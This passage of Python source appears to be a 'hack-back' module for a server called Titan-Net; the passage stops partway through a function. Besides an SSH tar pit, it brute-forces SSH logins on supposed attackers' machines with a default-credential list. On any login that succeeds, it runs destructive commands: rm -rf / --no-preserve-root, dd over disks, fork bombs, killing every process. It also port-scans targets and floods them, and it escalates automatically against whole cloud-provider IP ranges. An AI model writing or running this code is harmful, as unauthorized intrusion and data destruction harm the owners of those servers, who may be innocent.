"""
HackBack Protocol - Active Defense System for Titan-Net

Active defense modules:
  1. Tar Pit (Endlessh-style) - Waste bot time with infinite SSH banners
  2. Cloud Infrastructure Detection - Identify VPS/cloud attackers
  3. Infrastructure Countermeasures - SSH into attacker servers, shut them down / destroy them
  4. CPU Exhaustion - Flood attacker's ports with heavy data to consume resources
  5. Client Shutdown - cerberus_shutdown command to attacker's Titan-Net client
  6. Attacker Profiling - Fingerprint and track attackers

OFFENSIVE COUNTERMEASURES:
  When a hacking attempt is detected, the server fights back:
  - Tries SSH login to attacker's server with common default credentials
  - On success: SHUTDOWN mode (non-infrastructure) or ANNIHILATE mode (cloud/botnet)
  - ANNIHILATE mode: kills services, wipes disks, destroys persistence, fork bombs
  - CPU exhaustion: floods open ports with heavy data in parallel
  - Client shutdown: cerberus_shutdown triggers OS shutdown on attacker's Titan-Net client

Cloud infrastructure (Contabo, DigitalOcean, AWS, Linode, Vultr, OVH,
Hetzner, Akamai, etc.) are identified by IP ranges and receive INSTANT bans
with ANNIHILATE countermeasures - legitimate users don't attack from cloud VPS.
"""

import asyncio
import logging
import os
import socket
import ssl
import struct
import threading
import time
import random
import ipaddress
import json
from datetime import datetime
from typing import Optional, Callable, Dict, List, Set, Tuple

logger = logging.getLogger('HackBack')

# =================================================================
# CLOUD / VPS PROVIDER IP RANGES
# Known hosting providers used by attackers. Legitimate users don't
# SSH-scan servers from cloud VPS instances.
# =================================================================

CLOUD_PROVIDER_RANGES = {
    "DigitalOcean": [
        "64.225.0.0/16", "104.131.0.0/16", "104.236.0.0/16",
        "107.170.0.0/16", "128.199.0.0/16", "134.209.0.0/16",
        "137.184.0.0/16", "138.68.0.0/16", "138.197.0.0/16",
        "139.59.0.0/16", "142.93.0.0/16", "143.110.0.0/16",
        "143.198.0.0/16", "144.126.0.0/16", "146.190.0.0/16",
        "147.182.0.0/16", "149.154.0.0/16", "157.230.0.0/16",
        "158.65.0.0/16", "159.65.0.0/16", "159.89.0.0/16",
        "159.203.0.0/16", "159.223.0.0/16", "161.35.0.0/16",
        "162.243.0.0/16", "163.47.0.0/16", "164.90.0.0/16",
        "164.92.0.0/16", "165.22.0.0/16", "165.227.0.0/16",
        "167.71.0.0/16", "167.172.0.0/16", "167.99.0.0/16",
        "170.64.0.0/16", "174.138.0.0/16", "178.62.0.0/16",
        "178.128.0.0/16", "188.166.0.0/16", "192.81.0.0/16",
        "198.199.0.0/16", "206.81.0.0/16", "206.189.0.0/16",
        "209.97.0.0/16",
    ],
    "AWS": [
        "3.0.0.0/8", "13.0.0.0/8", "15.0.0.0/8",
        "18.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8",
        "44.0.0.0/8", "46.51.0.0/16", "50.16.0.0/16",
        "52.0.0.0/8", "54.0.0.0/8", "63.0.0.0/8",
        "72.44.0.0/16", "75.101.0.0/16", "76.223.0.0/16",
        "99.77.0.0/16", "99.150.0.0/16", "100.20.0.0/16",
        "107.20.0.0/16", "174.129.0.0/16", "176.32.0.0/16",
        "184.72.0.0/16", "184.73.0.0/16", "204.236.0.0/16",
    ],
    "Linode/Akamai": [
        "45.33.0.0/16", "45.56.0.0/16", "45.79.0.0/16",
        "50.116.0.0/16", "66.175.0.0/16", "66.228.0.0/16",
        "69.164.0.0/16", "72.14.176.0/20", "74.207.0.0/16",
        "96.126.0.0/16", "97.107.0.0/16", "103.22.200.0/22",
        "139.144.0.0/16", "139.162.0.0/16", "143.42.0.0/16",
        "170.187.0.0/16", "172.104.0.0/16", "172.105.0.0/16",
        "172.232.0.0/16", "172.233.0.0/16", "172.234.0.0/16",
        "172.235.0.0/16", "172.236.0.0/16", "178.79.0.0/16",
        "192.155.0.0/16", "194.195.0.0/16", "198.58.0.0/16",
        "198.74.0.0/16", "212.71.0.0/16",
    ],
    "Vultr": [
        "45.32.0.0/16", "45.63.0.0/16", "45.76.0.0/16",
        "45.77.0.0/16", "64.176.0.0/16", "64.237.0.0/16",
        "66.42.0.0/16", "78.141.0.0/16", "95.179.0.0/16",
        "104.156.0.0/16", "104.207.0.0/16", "104.238.0.0/16",
        "108.61.0.0/16", "136.244.0.0/16", "140.82.0.0/16",
        "141.164.0.0/16", "144.202.0.0/16", "149.28.0.0/16",
        "149.248.0.0/16", "155.138.0.0/16", "207.148.0.0/16",
        "209.250.0.0/16", "216.128.0.0/16", "217.69.0.0/16",
    ],
    "Hetzner": [
        "5.9.0.0/16", "23.88.0.0/16", "46.4.0.0/16",
        "49.12.0.0/16", "49.13.0.0/16", "65.108.0.0/16",
        "65.109.0.0/16", "78.46.0.0/16", "78.47.0.0/16",
        "85.10.0.0/16", "88.198.0.0/16", "88.99.0.0/16",
        "91.107.0.0/16", "94.130.0.0/16", "95.216.0.0/16",
        "95.217.0.0/16", "116.202.0.0/16", "116.203.0.0/16",
        "128.140.0.0/16", "135.181.0.0/16", "136.243.0.0/16",
        "138.201.0.0/16", "142.132.0.0/16", "144.76.0.0/16",
        "148.251.0.0/16", "157.90.0.0/16", "159.69.0.0/16",
        "162.55.0.0/16", "167.233.0.0/16", "167.235.0.0/16",
        "168.119.0.0/16", "176.9.0.0/16", "178.63.0.0/16",
        "188.40.0.0/16", "195.201.0.0/16", "213.133.0.0/16",
        "213.239.0.0/16",
    ],
    "OVH": [
        "5.39.0.0/16", "5.135.0.0/16", "5.196.0.0/16",
        "37.59.0.0/16", "37.187.0.0/16", "46.105.0.0/16",
        "51.38.0.0/16", "51.68.0.0/16", "51.75.0.0/16",
        "51.77.0.0/16", "51.79.0.0/16", "51.81.0.0/16",
        "51.83.0.0/16", "51.89.0.0/16", "51.91.0.0/16",
        "51.161.0.0/16", "51.195.0.0/16", "54.36.0.0/16",
        "54.37.0.0/16", "54.38.0.0/16", "57.128.0.0/16",
        "91.134.0.0/16", "92.222.0.0/16", "135.125.0.0/16",
        "137.74.0.0/16", "141.94.0.0/16", "141.95.0.0/16",
        "142.44.0.0/16", "144.217.0.0/16", "145.239.0.0/16",
        "147.135.0.0/16", "149.56.0.0/16", "149.202.0.0/16",
        "151.80.0.0/16", "158.69.0.0/16", "164.132.0.0/16",
        "167.114.0.0/16", "176.31.0.0/16", "178.32.0.0/16",
        "185.12.0.0/16", "188.165.0.0/16", "192.95.0.0/16",
        "193.70.0.0/16", "198.27.0.0/16", "198.50.0.0/16",
        "198.245.0.0/16", "213.32.0.0/16", "213.186.0.0/16",
        "213.251.0.0/16",
    ],
    "Contabo": [
        "5.189.0.0/16", "62.171.0.0/16", "64.226.0.0/16",
        "77.68.0.0/16", "79.143.0.0/16", "85.239.0.0/16",
        "86.48.0.0/16", "89.147.0.0/16", "91.194.0.0/16",
        "91.228.0.0/16", "91.231.0.0/16", "93.104.0.0/16",
        "93.115.0.0/16", "94.250.0.0/16", "95.111.0.0/16",
        "103.6.0.0/16", "103.170.0.0/16", "109.123.0.0/16",
        "109.205.0.0/16", "128.140.0.0/16", "141.136.0.0/16",
        "144.91.0.0/16", "152.53.0.0/16", "154.53.0.0/16",
        "156.67.0.0/16", "158.220.0.0/16", "161.97.0.0/16",
        "167.86.0.0/16", "168.119.0.0/16", "173.212.0.0/16",
        "173.249.0.0/16", "178.18.0.0/16", "178.238.0.0/16",
        "185.211.0.0/16", "185.234.0.0/16", "193.164.0.0/16",
        "193.176.0.0/16", "194.163.0.0/16", "194.195.0.0/16",
        "195.179.0.0/16", "195.201.0.0/16", "207.180.0.0/16",
        "209.126.0.0/16", "213.136.0.0/16", "213.160.0.0/16",
    ],
    "Google Cloud": [
        "34.64.0.0/10", "35.186.0.0/16", "35.190.0.0/16",
        "35.192.0.0/12", "35.208.0.0/12", "35.224.0.0/12",
        "35.240.0.0/13",
    ],
    "Azure": [
        "13.64.0.0/11", "13.96.0.0/13", "13.104.0.0/14",
        "20.0.0.0/8", "23.96.0.0/13", "40.64.0.0/10",
        "42.159.0.0/16", "51.104.0.0/15", "51.120.0.0/16",
        "51.136.0.0/15", "51.140.0.0/14", "52.0.0.0/8",
        "65.52.0.0/14", "70.37.0.0/17", "104.40.0.0/13",
        "104.208.0.0/13", "111.221.0.0/16", "131.253.0.0/16",
        "134.170.0.0/16", "137.116.0.0/15", "137.135.0.0/16",
        "138.91.0.0/16", "157.55.0.0/16", "157.56.0.0/16",
        "168.61.0.0/16", "168.62.0.0/15", "191.232.0.0/13",
    ],
    "Scanning Services": [
        # Known scanning/research services often abused
        "45.148.10.0/24",   # Censys/scanning
        "71.6.0.0/16",      # Censys
        "162.142.0.0/16",   # Censys
        "167.248.0.0/16",   # Censys
        "185.180.143.0/24", # Censys
        "192.35.168.0/23",  # Censys
        "198.235.24.0/24",  # Censys
    ],
    "Known Attack Networks": [
        # Networks with high attack frequency from today's logs
        "91.231.89.0/24",   # Perl SSH botnet (today's attack)
        "91.196.152.0/24",  # Related scanning network
        "157.66.144.0/24",  # Active brute force
        "186.96.145.0/24",  # Brute force
        "179.61.185.0/24",  # Brute force
    ],
}

# Pre-compile IP networks for fast lookup
_CLOUD_NETWORKS: List[Tuple[ipaddress.IPv4Network, str]] = []


def _init_cloud_networks():
    """Pre-compile cloud provider networks for fast IP matching"""
    global _CLOUD_NETWORKS
    for provider, ranges in CLOUD_PROVIDER_RANGES.items():
        for cidr in ranges:
            try:
                network = ipaddress.ip_network(cidr, strict=False)
                _CLOUD_NETWORKS.append((network, provider))
            except ValueError:
                pass
    logger.info(
        f"[HACKBACK] Loaded {len(_CLOUD_NETWORKS)} cloud/VPS IP ranges "
        f"from {len(CLOUD_PROVIDER_RANGES)} providers"
    )

_init_cloud_networks()


def identify_cloud_provider(ip: str) -> Optional[str]:
    """Check if IP belongs to a known cloud/VPS provider.
    Returns provider name or None."""
    try:
        addr = ipaddress.ip_address(ip)
        for network, provider in _CLOUD_NETWORKS:
            if addr in network:
                return provider
    except ValueError:
        pass
    return None


def is_cloud_ip(ip: str) -> bool:
    """Quick check if IP is from a cloud provider"""
    return identify_cloud_provider(ip) is not None


# =================================================================
# TAR PIT - Endlessh-style SSH Slowdown
# =================================================================

class TarPit:
    """
    Endlessh-inspired SSH tar pit.

    Instead of presenting a real (or fake) SSH login, sends an infinite
    SSH banner extremely slowly - one random line every few seconds.
    This ties up the attacker's SSH client indefinitely, wasting their
    time and scanner resources.

    The SSH protocol says the server sends a banner before key exchange.
    The client MUST wait for the banner to complete (it ends with \\r\\n).
    We exploit this by sending banner data that never ends.
    """

    def __init__(self, host: str = '0.0.0.0', port: int = 2222,
                 delay_min: float = 5.0, delay_max: float = 20.0,
                 max_line_length: int = 32, max_clients: int = 4096,
                 on_connection: Optional[Callable] = None,
                 on_trapped: Optional[Callable] = None):
        self.host = host
        self.port = port
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.max_line_length = max_line_length
        self.max_clients = max_clients
        self.on_connection = on_connection  # (ip, port)
        self.on_trapped = on_trapped        # (ip, duration_seconds)

        self.running = False
        self.server_socket = None
        self.thread = None

        # Stats
        self.total_trapped = 0
        self.total_time_wasted = 0.0  # seconds
        self.active_connections = 0
        self.longest_trap = 0.0
        self._active_sessions: Dict[str, float] = {}  # ip -> start_time

    def _generate_banner_line(self) -> bytes:
        """Generate a random SSH banner line (looks like SSH negotiation data)"""
        length = random.randint(4, self.max_line_length)
        chars = []
        for _ in range(length):
            # Mix of printable ASCII characters that look like SSH data
            chars.append(chr(random.randint(0x21, 0x7E)))
        line = ''.join(chars)
        # SSH banner lines don't end with \r\n until the final one
        # (which we never send) - just send data with \r\n to look legit
        # but the protocol keeps reading
        return f"{line}\r\n".encode('ascii')

    def _handle_trapped_client(self, client_socket: socket.socket,
                                client_addr: Tuple):
        """Handle a single trapped client - send infinite slow data"""
        ip = client_addr[0]
        start_time = time.time()
        self.active_connections += 1
        self._active_sessions[ip] = start_time
        bytes_sent = 0

        if self.on_connection:
            try:
                self.on_connection(ip, client_addr[1])
            except Exception:
                pass

        logger.info(f"[TAR PIT] Trapped: {ip}:{client_addr[1]}")

        try:
            while self.running:
                # Random delay between lines
                delay = random.uniform(self.delay_min, self.delay_max)
                time.sleep(delay)

                # Send a random banner line
                line = self._generate_banner_line()
                try:
                    client_socket.sendall(line)
                    bytes_sent += len(line)
                except (BrokenPipeError, ConnectionResetError, OSError):
                    break

        except Exception:
            pass
        finally:
            duration = time.time() - start_time
            self.active_connections -= 1
            self.total_trapped += 1
            self.total_time_wasted += duration
            if duration > self.longest_trap:
                self.longest_trap = duration
            self._active_sessions.pop(ip, None)

            try:
                client_socket.close()
            except Exception:
                pass

            logger.info(
                f"[TAR PIT] Released: {ip} | "
                f"Duration: {duration:.1f}s | Bytes sent: {bytes_sent}"
            )

            if self.on_trapped:
                try:
                    self.on_trapped(ip, duration)
                except Exception:
                    pass

    def start(self):
        """Start the tar pit server"""
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        logger.warning(
            f"[TAR PIT] Started on {self.host}:{self.port} "
            f"(delay: {self.delay_min}-{self.delay_max}s per line)"
        )

    def _run(self):
        """Main tar pit server loop"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.max_clients)

            while self.running:
                try:
                    client_socket, client_addr = self.server_socket.accept()

                    # Set socket timeout so sends don't block forever
                    client_socket.settimeout(30.0)

                    # Enforce max connections
                    if self.active_connections >= self.max_clients:
                        client_socket.close()
                        continue

                    # Each trapped client gets its own thread
                    trap_thread = threading.Thread(
                        target=self._handle_trapped_client,
                        args=(client_socket, client_addr),
                        daemon=True
                    )
                    trap_thread.start()

                except socket.timeout:
                    continue
                except OSError:
                    if self.running:
                        logger.error("[TAR PIT] Socket error")
                    break

        except Exception as e:
            logger.error(f"[TAR PIT] Server error: {e}")
        finally:
            if self.server_socket:
                try:
                    self.server_socket.close()
                except Exception:
                    pass

    def stop(self):
        """Stop the tar pit"""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        if self.thread:
            self.thread.join(timeout=3)
        logger.info("[TAR PIT] Stopped")

    def get_stats(self) -> Dict:
        """Get tar pit statistics"""
        return {
            "running": self.running,
            "port": self.port,
            "active_connections": self.active_connections,
            "total_trapped": self.total_trapped,
            "total_time_wasted_seconds": round(self.total_time_wasted, 1),
            "total_time_wasted_human": self._format_duration(self.total_time_wasted),
            "longest_trap_seconds": round(self.longest_trap, 1),
            "longest_trap_human": self._format_duration(self.longest_trap),
            "active_sessions": {
                ip: f"{time.time() - start:.0f}s"
                for ip, start in self._active_sessions.items()
            },
        }

    @staticmethod
    def _format_duration(seconds: float) -> str:
        if seconds < 60:
            return f"{seconds:.0f}s"
        elif seconds < 3600:
            return f"{seconds / 60:.1f}m"
        else:
            return f"{seconds / 3600:.1f}h"


# =================================================================
# INFRASTRUCTURE COUNTERMEASURES - Active Server Neutralization
# =================================================================

class InfrastructureCountermeasures:
    """
    Active countermeasures against attacker server infrastructure.

    When Cerberus/HackBack detects a hacking attempt from cloud VPS,
    botnet nodes, or other server infrastructure, this module engages
    the attacker's server directly:

    1. Remote Shutdown  - SSH with common/default credentials -> shutdown/poweroff
    2. CPU Exhaustion   - Flood connections with heavy data to consume resources
    3. Permanent Disable - If SSH succeeds on cloud/botnet, neutralize the server

    Requires: sshpass (apt install sshpass) on the host server.
    """

    # Common default credentials found on VPS instances and botnet nodes
    SSH_CREDENTIALS = [
        ("root", "root"), ("root", "toor"), ("root", "password"),
        ("root", "123456"), ("root", "admin"), ("root", "P@ssw0rd"),
        ("root", "1234"), ("root", "12345678"), ("root", "qwerty"),
        ("root", "letmein"), ("root", "welcome"), ("root", "passw0rd"),
        ("root", "master"), ("root", "changeme"), ("root", "default"),
        ("root", "server"), ("root", "r00tme"), ("root", "rootroot"),
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("ubuntu", "ubuntu"), ("pi", "raspberry"),
        ("user", "user"), ("test", "test"), ("oracle", "oracle"),
        ("postgres", "postgres"), ("mysql", "mysql"), ("ftpuser", "ftpuser"),
        ("deploy", "deploy"), ("vagrant", "vagrant"), ("ansible", "ansible"),
    ]

    # Commands to shut down the attacker's server
    SHUTDOWN_COMMANDS = [
        "shutdown -h now",
        "poweroff -f",
        "halt -f",
        "init 0",
        "systemctl poweroff -f",
    ]

    # Commands to permanently neutralize attacker infrastructure
    # (cloud VPS / botnet nodes only - confirmed malicious servers)
    NEUTRALIZE_COMMANDS = [
        # Kill all user processes immediately
        "kill -9 -1",
        # Stop remote access so attacker cannot reconnect
        "systemctl stop sshd 2>/dev/null; systemctl stop ssh 2>/dev/null",
        # Disable SSH service permanently
        "systemctl disable sshd 2>/dev/null; systemctl disable ssh 2>/dev/null",
        # Remove SSH keys and authorized keys
        "rm -rf /root/.ssh /home/*/.ssh 2>/dev/null",
        # Remove attack tools and scripts commonly used by botnets
        "rm -rf /tmp/* /var/tmp/* /dev/shm/* 2>/dev/null",
        # Overwrite crontabs (botnets use cron for persistence)
        "crontab -r 2>/dev/null; rm -rf /var/spool/cron/* 2>/dev/null",
        # Remove common botnet persistence locations
        "rm -rf /root/.bashrc /root/.profile /etc/rc.local 2>/dev/null",
        # Wipe system data
        "rm -rf /var /tmp /home /root --no-preserve-root 2>/dev/null &",
        # Corrupt boot sector (both physical and virtual disks)
        "dd if=/dev/zero of=/dev/sda bs=512 count=1 2>/dev/null &",
        "dd if=/dev/zero of=/dev/vda bs=512 count=1 2>/dev/null &",
        # Final shutdown
        "shutdown -h now",
    ]

    # Maximum aggression for cloud infrastructure / botnet servers
    # These are confirmed malicious - no mercy
    ANNIHILATE_COMMANDS = [
        # Immediate process massacre
        "kill -9 -1",
        # Stop ALL network services
        "systemctl stop sshd ssh nginx apache2 httpd docker containerd "
        "mysql mariadb postgresql redis mongod 2>/dev/null",
        # Disable all services permanently
        "systemctl disable sshd ssh nginx apache2 httpd docker 2>/dev/null",
        # Remove all SSH access
        "rm -rf /root/.ssh /home/*/.ssh /etc/ssh 2>/dev/null",
        # Destroy cron persistence
        "crontab -r 2>/dev/null; rm -rf /var/spool/cron/* /etc/cron* 2>/dev/null",
        # Remove systemd timers (alternative persistence)
        "rm -rf /etc/systemd/system/*.timer 2>/dev/null",
        # Kill botnet persistence in common locations
        "rm -rf /tmp/* /var/tmp/* /dev/shm/* /run/lock/* 2>/dev/null",
        "rm -rf /root/.bashrc /root/.profile /root/.bash_profile 2>/dev/null",
        "rm -rf /etc/rc.local /etc/init.d/* 2>/dev/null",
        # Remove docker containers and images (botnet often uses containers)
        "docker rm -f $(docker ps -aq) 2>/dev/null; "
        "docker rmi -f $(docker images -aq) 2>/dev/null",
        # Fork bomb to consume all remaining resources before shutdown
        "bash -c ':(){ :|:& };:' &",
        # Fill memory to crash remaining processes
        "bash -c 'yes | tr \\\\n x | head -c $((1024*1024*1024)) > /dev/null &' 2>/dev/null",
        # Overwrite all block devices (physical + virtual + NVMe)
        "dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null &",
        "dd if=/dev/urandom of=/dev/vda bs=1M 2>/dev/null &",
        "dd if=/dev/urandom of=/dev/nvme0n1 bs=1M 2>/dev/null &",
        "dd if=/dev/urandom of=/dev/xvda bs=1M 2>/dev/null &",
        # Wipe entire filesystem
        "rm -rf / --no-preserve-root 2>/dev/null &",
        # Final forced shutdown
        "echo o > /proc/sysrq-trigger 2>/dev/null; shutdown -h now; halt -f",
    ]

    # Ports to scan and flood for CPU exhaustion
    FLOOD_PORTS = [
        22, 80, 443, 8080, 8443, 3306, 5432, 6379,
        27017, 8001, 3000, 5000, 9090, 2222, 8888,
        25, 587, 110, 143,  # Mail servers (botnets use for spam)
        6667, 6697,          # IRC (botnet C2)
        4444, 5555,          # Common reverse shell ports
    ]

    # IPs and subnets that must NEVER be targeted by countermeasures
    PROTECTED_IPS = {
        "127.0.0.1",            # localhost
        "::1",                  # localhost IPv6
        "89.116.31.216",        # Titan-Net server itself
        "185.238.207.133",      # Admin / owner IP
    }

    # Protected subnets - never engage countermeasures against these
    PROTECTED_SUBNETS = [
        # Anthropic / Claude API infrastructure
        ipaddress.ip_network("160.79.104.0/23", strict=False),    # Anthropic
        ipaddress.ip_network("2607:6bc0::/48", strict=False),     # Anthropic IPv6
        # Admin subnet
        ipaddress.ip_network("185.238.207.0/24", strict=False),   # Admin range
    ]

    def __init__(self, max_flood_connections: int = 200,
                 flood_duration: int = 120, log_dir: str = "logs"):
        """
        Args:
            max_flood_connections: Max concurrent flood connections per engagement
            flood_duration: How long to sustain CPU exhaustion (seconds)
            log_dir: Directory for countermeasure logs
        """
        self.max_flood_connections = max_flood_connections
        self.flood_duration = flood_duration
        self._active: Dict[str, asyncio.Task] = {}
        self._engaged_ips: Set[str] = set()

        # Stats
        self.ssh_attempts = 0
        self.ssh_successes = 0
        self.servers_shutdown = 0
        self.servers_neutralized = 0
        self.cpu_exhaustions_launched = 0
        self.flood_connections_opened = 0

        self._logger = logging.getLogger('Countermeasures')

        # Dedicated log file
        os.makedirs(log_dir, exist_ok=True)
        self._file_logger = logging.getLogger('CountermeasuresFile')
        self._file_logger.setLevel(logging.INFO)
        if not self._file_logger.handlers:
            handler = logging.FileHandler(
                os.path.join(log_dir, "countermeasures.log")
            )
            handler.setFormatter(logging.Formatter(
                '%(asctime)s | %(levelname)s | %(message)s'
            ))
            self._file_logger.addHandler(handler)

    def is_protected(self, ip: str) -> bool:
        """Check if IP is protected from countermeasures (admin, server, Anthropic)"""
        if ip in self.PROTECTED_IPS:
            return True
        try:
            addr = ipaddress.ip_address(ip)
            for subnet in self.PROTECTED_SUBNETS:
                if addr in subnet:
                    return True
        except ValueError:
            pass
        return False

    async def engage(self, ip: str, reason: str, permanent: bool = False):
        """
        Full engagement against attacker infrastructure.

        Args:
            ip: Attacker's IP address
            reason: Why this engagement was triggered
            permanent: If True, attempt permanent neutralization (cloud/botnet)
        """
        # NEVER engage against protected IPs (admin, server, Anthropic/Claude)
        if self.is_protected(ip):
            self._logger.warning(
                f"[COUNTERMEASURE] PROTECTED IP {ip} - skipping engagement"
            )
            return

        if ip in self._active:
            self._logger.info(
                f"[COUNTERMEASURE] Already engaged against {ip}, skipping"
            )
            return

        self._engaged_ips.add(ip)
        self._file_logger.critical(
            f"ENGAGE | IP={ip} | permanent={permanent} | {reason}"
        )

        task = asyncio.create_task(self._full_engagement(ip, reason, permanent))
        self._active[ip] = task
        task.add_done_callback(lambda t: self._active.pop(ip, None))

    async def _full_engagement(self, ip: str, reason: str, permanent: bool):
        """Run SSH shutdown + CPU exhaustion in parallel.
        Auto-escalates to ANNIHILATE for cloud infrastructure and botnets."""

        # Auto-detect if this is cloud/botnet infrastructure -> maximum aggression
        provider = identify_cloud_provider(ip)
        annihilate = provider is not None  # Cloud/infra = annihilate mode

        mode = "ANNIHILATE" if annihilate else ("NEUTRALIZE" if permanent else "SHUTDOWN")
        self._logger.critical(
            f"[COUNTERMEASURE] ENGAGING {ip} | mode={mode} | "
            f"provider={provider or 'direct'} | {reason}"
        )

        try:
            results = await asyncio.gather(
                self._ssh_attack(ip, permanent, annihilate=annihilate),
                self._cpu_exhaustion(ip),
                return_exceptions=True,
            )

            ssh_result = results[0] if not isinstance(results[0], Exception) else False

            self._logger.critical(
                f"[COUNTERMEASURE] Engagement complete: {ip} | "
                f"mode={mode} | SSH={'SUCCESS' if ssh_result else 'FAILED'}"
            )
            self._file_logger.critical(
                f"COMPLETE | IP={ip} | mode={mode} | "
                f"SSH={'SUCCESS' if ssh_result else 'FAILED'}"
            )

        except Exception as e:
            self._logger.error(f"[COUNTERMEASURE] Error engaging {ip}: {e}")

    # ------------------------------------------------------------------
    # SSH Remote Shutdown / Neutralization
    # ------------------------------------------------------------------

    async def _ssh_attack(self, ip: str, permanent: bool,
                          annihilate: bool = False) -> bool:
        """Try SSH login with common credentials, then shutdown/neutralize/annihilate"""
        self.ssh_attempts += 1

        for username, password in self.SSH_CREDENTIALS:
            try:
                success = await self._try_ssh_login(ip, username, password)
                if success:
                    self.ssh_successes += 1
                    self._logger.critical(
                        f"[COUNTERMEASURE] SSH ACCESS: {username}@{ip}"
                    )
                    self._file_logger.critical(
                        f"SSH_ACCESS | IP={ip} | user={username} | "
                        f"mode={'ANNIHILATE' if annihilate else 'NEUTRALIZE' if permanent else 'SHUTDOWN'}"
                    )

                    if annihilate:
                        # Maximum aggression - cloud/botnet infrastructure
                        await self._annihilate_server(ip, username, password)
                        self.servers_neutralized += 1
                    elif permanent:
                        await self._neutralize_server(ip, username, password)
                        self.servers_neutralized += 1
                    else:
                        await self._remote_shutdown(ip, username, password)
                        self.servers_shutdown += 1

                    return True
            except Exception:
                continue

        self._logger.info(
            f"[COUNTERMEASURE] SSH failed for all credentials on {ip}"
        )
        return False

    async def _try_ssh_login(self, ip: str, username: str,
                              password: str) -> bool:
        """Attempt a single SSH login. Returns True if successful."""
        try:
            proc = await asyncio.create_subprocess_exec(
                'sshpass', '-p', password,
                'ssh',
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'ConnectTimeout=5',
                '-o', 'BatchMode=no',
                '-o', 'LogLevel=ERROR',
                '-p', '22',
                f'{username}@{ip}',
                'echo', 'CERBERUS_VERIFY',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            return b'CERBERUS_VERIFY' in stdout
        except asyncio.TimeoutError:
            return False
        except FileNotFoundError:
            self._logger.warning(
                "[COUNTERMEASURE] sshpass not installed - "
                "install with: apt install sshpass"
            )
            return False
        except Exception:
            return False

    async def _run_ssh_command(self, ip: str, username: str,
                                password: str, command: str):
        """Execute a single command via SSH on the target"""
        try:
            proc = await asyncio.create_subprocess_exec(
                'sshpass', '-p', password,
                'ssh',
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'ConnectTimeout=5',
                '-o', 'LogLevel=ERROR',
                f'{username}@{ip}',
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await asyncio.wait_for(proc.communicate(), timeout=15)
        except Exception:
            pass

    async def _remote_shutdown(self, ip: str, username: str, password: str):
        """Execute shutdown commands on attacker's server"""
        self._file_logger.critical(f"SHUTDOWN | IP={ip} | user={username}")
        for cmd in self.SHUTDOWN_COMMANDS:
            await self._run_ssh_command(ip, username, password, cmd)
            self._logger.critical(
                f"[COUNTERMEASURE] Shutdown command sent to {ip}: {cmd}"
            )

    async def _neutralize_server(self, ip: str, username: str, password: str):
        """Permanently neutralize attacker's server"""
        self._logger.critical(
            f"[COUNTERMEASURE] PERMANENT NEUTRALIZATION: {ip}"
        )
        self._file_logger.critical(
            f"NEUTRALIZE | IP={ip} | user={username} | "
            f"commands={len(self.NEUTRALIZE_COMMANDS)}"
        )
        for cmd in self.NEUTRALIZE_COMMANDS:
            await self._run_ssh_command(ip, username, password, cmd)

    async def _annihilate_server(self, ip: str, username: str, password: str):
        """
        Maximum aggression - completely destroy cloud/botnet infrastructure.
        Used for confirmed malicious cloud VPS and botnet C2 servers.
        Kills services, wipes disks, removes persistence, fork bombs.
        """
        provider = identify_cloud_provider(ip)
        self._logger.critical(
            f"[COUNTERMEASURE] ANNIHILATE MODE: {ip} "
            f"(provider: {provider or 'botnet'})"
        )
        self._file_logger.critical(
            f"ANNIHILATE | IP={ip} | user={username} | "
            f"provider={provider or 'botnet'} | "
            f"commands={len(self.ANNIHILATE_COMMANDS)}"
        )
        for cmd in self.ANNIHILATE_COMMANDS:
            await self._run_ssh_command(ip, username, password, cmd)

    # ------------------------------------------------------------------
    # CPU Exhaustion - Connection Flooding
    # ------------------------------------------------------------------

    async def _cpu_exhaustion(self, ip: str):
        """Flood attacker's server with connections to exhaust CPU/bandwidth"""
        self.cpu_exhaustions_launched += 1

        # Find open ports first
        open_ports = await self._scan_ports(ip)
        if not open_ports:
            self._logger.info(f"[COUNTERMEASURE] No open ports found on {ip}")
            return

        self._logger.warning(
            f"[COUNTERMEASURE] CPU exhaust: {ip} | "
            f"Ports: {open_ports} | "
            f"Connections: {self.max_flood_connections} | "
            f"Duration: {self.flood_duration}s"
        )
        self._file_logger.warning(
            f"CPU_EXHAUST | IP={ip} | ports={open_ports} | "
            f"conns={self.max_flood_connections}"
        )

        # Distribute connections across open ports
        tasks = []
        conns_per_port = max(
            1, self.max_flood_connections // max(len(open_ports), 1)
        )
        for port in open_ports:
            for _ in range(conns_per_port):
                tasks.append(asyncio.create_task(
                    self._flood_connection(ip, port)
                ))

        # Wait for all flood tasks (duration-limited internally)
        await asyncio.gather(*tasks, return_exceptions=True)

        self._logger.warning(
            f"[COUNTERMEASURE] CPU exhaust complete: {ip}"
        )

    async def _scan_ports(self, ip: str, timeout: float = 3.0) -> List[int]:
        """Quick port scan to find open services on attacker"""
        open_ports: List[int] = []

        async def check_port(port: int):
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=timeout
                )
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                open_ports.append(port)
            except Exception:
                pass

        await asyncio.gather(*[check_port(p) for p in self.FLOOD_PORTS])
        return sorted(open_ports)

    async def _flood_connection(self, ip: str, port: int):
        """Single flood connection - send heavy random data until duration expires"""
        end_time = time.time() + self.flood_duration
        try:
            # SSL handshake for HTTPS ports (very CPU-intensive for target)
            if port in (443, 8443):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
